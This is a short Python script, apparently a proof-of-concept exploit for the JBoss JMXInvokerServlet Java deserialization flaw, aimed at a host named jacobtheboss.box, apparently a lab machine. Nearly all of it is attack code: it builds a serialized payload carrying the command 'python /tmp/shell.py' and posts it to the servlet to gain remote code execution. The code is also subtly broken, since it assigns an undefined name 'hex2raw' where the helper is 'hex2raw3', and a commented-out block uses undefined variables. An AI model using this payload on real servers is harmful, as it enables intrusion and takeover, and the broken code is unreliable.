import requests

def hex2raw3(teststr):
    """

    This function takes a string (expecting hexstring) and returns byte string
    """
    # From: HexToByte() at http://code.activestate.com/recipes/510399-byte-to-hex-and-hex-to-byte-string-conversion/
    bytes = []
    teststr = ''.join( teststr.split(" ") )
    for i in range(0, len(teststr), 2):
        bytes.append( chr( int (teststr[i:i+2], 16 ) ) )
    return "".join(bytes)


def jboss_attack():
    # The below code is based on the jboss_java_serialize.nasl script within Nessus 
    """
    This function sets up the attack payload for JBoss
    """
    body_serObj = hex2raw
    _cmd= "python /tmp/shell.py"
    cleng = len(_cmd)
    body_serObj += chr(cleng) + _cmd
    body_serObj += hex2raw3("740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A")

    headers = {
        "User-Agent":"JBoss_RCE_POC",
        "Content-type":"application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
        "Content-length":"%d" % len(body_serObj)
    }
    resp = requests.post('http://jacobtheboss.box:8080/invoker/JMXInvokerServlet', headers=headers, verify=False, data = body_serObj)
    
    print(resp.status_code, resp.raw, resp.content, resp.headers)
    with open('pyfile.ser', 'wb') as ff:
        ff.write(resp.content)
        ff.close()
    print(dir(resp))
    # if SSL_On:
    #     webservice = httplib2.Http(disable_ssl_certificate_validation=True)
    #     URL_ADDR = "%s://%s:%s" % ('https',HOST,PORT)
    # else:
    #     webservice = httplib2.Http()
    #     URL_ADDR = "%s://%s:%s" % ('http',HOST,PORT)
    # headers = {"User-Agent":"JBoss_RCE_POC",
    #         "Content-type":"application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
    #         "Content-length":"%d" % len(body_serObj)
    #     }
    # resp, content = webservice.request(URL_ADDR+"/invoker/JMXInvokerServlet", "POST", body=body_serObj, headers=headers, verify=False)
    # # print provided response.
    # print("[i] Response received from target: %s" % resp)

jboss_attack()